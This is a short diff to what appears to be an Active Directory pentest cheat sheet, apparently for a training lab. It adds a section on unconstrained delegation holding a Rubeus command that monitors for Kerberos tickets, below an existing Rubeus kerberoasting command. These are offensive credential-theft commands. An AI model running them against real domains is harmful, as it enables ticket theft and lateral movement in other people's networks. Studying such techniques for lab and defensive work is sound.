@@ -30,3 +30,7 @@ Rubeus.exe kerberoast /nopreauth:amber.smith /domain:inlanefreight.local /spn:MS
 
 ---
 
+### Uncostrained delegation
+```
+.\Rubeus.exe monitor /interval:5 /nowrap
+```
